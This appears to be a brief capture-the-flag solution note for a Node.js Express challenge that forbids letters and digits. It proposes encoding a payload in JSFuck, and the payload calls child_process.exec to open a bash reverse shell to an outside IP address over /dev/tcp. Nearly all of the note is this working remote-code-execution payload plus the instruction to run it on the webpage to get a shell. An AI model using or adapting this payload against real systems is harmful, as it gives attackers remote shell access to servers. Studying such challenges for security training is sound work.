# This challenge cannot use any A-Z a-z 0-9, so we can only use special characters. (Run by Node.js Express)
# And JSFuck fulfills our requirement! It also works in Node.js too!

# Payload:
# require('child_process').exec('bash -c "bash -i >& /dev/tcp/61.228.216.165/443 0>&1"')
# 
# Turn above payload into JSFuck and run it on the webpage to get shell!